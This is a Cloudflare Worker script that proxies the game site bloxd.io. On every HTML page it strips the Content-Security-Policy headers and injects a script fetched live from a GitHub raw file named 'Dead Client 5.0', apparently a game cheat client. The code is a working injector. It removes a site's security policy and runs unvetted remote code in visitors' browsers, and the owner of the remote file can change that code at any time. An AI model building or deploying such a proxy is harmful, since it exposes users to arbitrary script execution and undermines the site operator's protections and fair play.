export default {
  async fetch(request) {
    try {
      const incomingUrl = new URL(request.url);
      const targetUrl = new URL(
        incomingUrl.pathname + incomingUrl.search,
        "https://bloxd.io"
      );

      const upstreamResponse = await fetch(new Request(targetUrl, request));
      const contentType = upstreamResponse.headers.get("content-type") || "";

      if (!contentType.includes("text/html")) {
        return upstreamResponse;
      }

      const rawScriptUrl =
        "https://raw.githubusercontent.com/RyasDue/public-class-Main-public-static-void-main-String-args-System.out.println-/refs/heads/main/Dead%20Client%205.0.txt";

      const scriptResponse = await fetch(`${rawScriptUrl}?t=${Date.now()}`);

      if (!scriptResponse.ok) {
        return new Response(`Uzak betik alınamadı: HTTP ${scriptResponse.status}`, {
          status: 502,
        });
      }

      const code = (await scriptResponse.text()).replace(/<\/script/gi, "<\\/script");
      const headers = new Headers(upstreamResponse.headers);

      headers.delete("content-security-policy");
      headers.delete("content-security-policy-report-only");

      return new HTMLRewriter()
        .on("head", {
          element(element) {
            element.prepend(`<script>${code}</script>`, { html: true });
          },
        })
        .transform(
          new Response(upstreamResponse.body, {
            status: upstreamResponse.status,
            statusText: upstreamResponse.statusText,
            headers,
          })
        );
    } catch (error) {
      return new Response(`Worker hatası: ${error?.stack || error}`, {
        status: 500,
      });
    }
  },
};
